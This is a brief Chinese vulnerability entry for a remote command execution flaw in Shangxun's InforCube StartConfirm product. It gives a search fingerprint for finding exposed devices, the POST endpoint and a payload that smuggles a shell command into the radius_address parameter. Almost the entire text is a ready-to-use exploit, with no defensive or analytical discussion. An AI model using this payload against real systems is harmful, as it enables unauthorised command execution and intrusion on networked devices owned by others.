# 上讯InforCube-StartConfirm存在远程命令执行漏洞

上讯 ｜ 命令执行 ｜ —
- **指纹**：`body="default/getloginhtml"`
- **请求**：`POST /en/9-2radius.php?authority=6 HTTP/1.1`

**Payload**
```
save=1&enable_radius=1&radius_address=/';id;+#+
```
- **响应特征**：200